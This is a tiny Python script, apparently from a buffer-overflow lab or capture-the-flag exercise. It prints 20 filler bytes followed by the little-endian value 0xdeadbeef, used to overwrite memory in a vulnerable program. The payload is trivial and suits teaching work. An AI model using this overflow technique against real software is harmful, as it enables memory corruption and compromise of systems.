#!/usr/bin/python

import os
import sys


print ("B"*20 + "\xef\xbe\xad\xde")
